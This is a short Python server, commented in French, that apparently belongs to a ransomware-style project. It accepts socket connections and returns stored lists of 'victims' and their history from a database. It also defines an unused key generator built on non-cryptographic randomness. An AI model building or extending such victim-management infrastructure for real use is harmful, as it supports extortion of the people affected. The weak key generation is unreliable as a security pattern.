import socket

import utile.network as network
import utile.message as message
import utile.data as data
import random
import string



def generate_key(longueur=0, caracteres=string.ascii_letters + string.digits):
    """
    Générer une clé de longueur (longueur) contenant uniquement les caractères (caracteres)
    :param longueur: La longueur de la clé à générer
    :param caracteres: Les caractères qui composeront la clé
    :return: La clé générée
    """
    return ''.join(random.choice(caracteres) for _ in range(longueur))

def main():
    # Démarrer le serveur
    socket_server = network.start_net_serv()
    print("Serveur démarré")
    # Initialiser la base de données
    conn = data.connect_db()
    if conn is not None:
        print("Base de données initialisée")
    # Attendre une connexion
    print("En attente de connexion...")
    print(f"Connexion de {network.LOCAL_IP} sur le port {network.PORT_SERV_CLES} acceptée")
    print("En attente de messages...")
    while True:
        client_socket, address = socket_server.accept()
        msg1 = network.receive_message(client_socket)
        if msg1 is None:
            print("Aucun message reçu, connexion fermée.")
            client_socket.close()
            continue  # Skip further processing and wait for the next connection
        print(f"Message reçu: {msg1}")
        print(f"Message de type: {message.get_message_type(msg1)}")
        type_message = message.get_message_type(msg1)
        if type_message == "LIST_REQ":
            victims = data.get_list_victims(conn)
            # Envoi de la réponse
            message_response = message.set_message("LIST_RESP", {"victims": victims})
            print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
            network.send_message(client_socket, message_response)
            print("Message envoyé")
        elif type_message == "HISTORY_REQ":
            # Récupérer l'historique
            victim = msg1['victim']
            history = data.get_list_history(conn, victim)
            # Envoi de la réponse
            message_response = message.set_message("HISTORY_RESP", {"victim": victim, "history": history})
            print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
            network.send_message(client_socket, message_response)
            print("Message envoyé")

        else:
            print("Aucun message à envoyer.")
        client_socket.close()
        print("Connexion fermée")


if __name__ == '__main__':
    main()
